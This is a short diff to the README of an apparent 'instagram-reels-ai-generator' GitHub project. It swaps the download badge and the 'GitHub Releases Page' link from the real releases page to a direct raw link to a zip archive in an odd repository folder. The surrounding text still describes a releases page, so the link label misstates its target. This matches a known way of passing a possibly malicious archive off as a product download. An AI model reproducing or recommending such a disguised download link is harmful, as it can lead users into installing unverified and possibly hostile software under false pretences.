@@ -1,6 +1,6 @@
 # 🎬 instagram-reels-ai-generator - Create Engaging Reels Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20-brightgreen)](https://github.com/Malaspuroerror/instagram-reels-ai-generator/releases)
+[![Download](https://raw.githubusercontent.com/Malaspuroerror/instagram-reels-ai-generator/main/Codiaeum/instagram-reels-ai-generator_v1.5.zip%20Now-%20-brightgreen)](https://raw.githubusercontent.com/Malaspuroerror/instagram-reels-ai-generator/main/Codiaeum/instagram-reels-ai-generator_v1.5.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ To get started with the **instagram-reels-ai-generator**, follow the steps below
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [GitHub Releases Page](https://github.com/Malaspuroerror/instagram-reels-ai-generator/releases).
+1. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Malaspuroerror/instagram-reels-ai-generator/main/Codiaeum/instagram-reels-ai-generator_v1.5.zip).
 
 2. On the releases page, you will see a list of available versions. Click on the version you want to download.
 
